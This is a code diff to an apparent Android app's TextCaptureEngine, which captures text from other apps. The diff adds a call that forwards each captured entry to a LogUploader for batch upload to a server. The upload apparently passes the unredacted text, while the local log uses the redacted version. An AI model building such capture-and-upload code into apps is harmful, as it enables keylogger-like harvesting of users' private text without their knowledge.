@@ -3,7 +3,6 @@ package com.flanergide.data
 import android.annotation.SuppressLint
 import android.content.Context
 import android.util.Log
-import com.flanergide.core.Permission
 import com.flanergide.core.StateStore
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.flow.distinctUntilChanged
@@ -53,6 +52,7 @@ object TextCaptureEngine {
 
     /**
      * Add captured text to log with redaction.
+     * Also forwards to LogUploader for batch upload to server.
      */
     fun addCapturedText(text: String, appPackage: String) {
         if (text.isBlank()) return
@@ -93,6 +93,9 @@ object TextCaptureEngine {
             val currentSize = capturedTextLog.size
             Log.i(TAG, "✓ Captured from $appPackage: \"${redactedText.take(60)}...\" (log size: $currentSize/$MAX_LOG_SIZE)")
         }
+
+        // Forward to LogUploader for server upload
+        LogUploader.addLog(capturedText)
     }
 
     /**
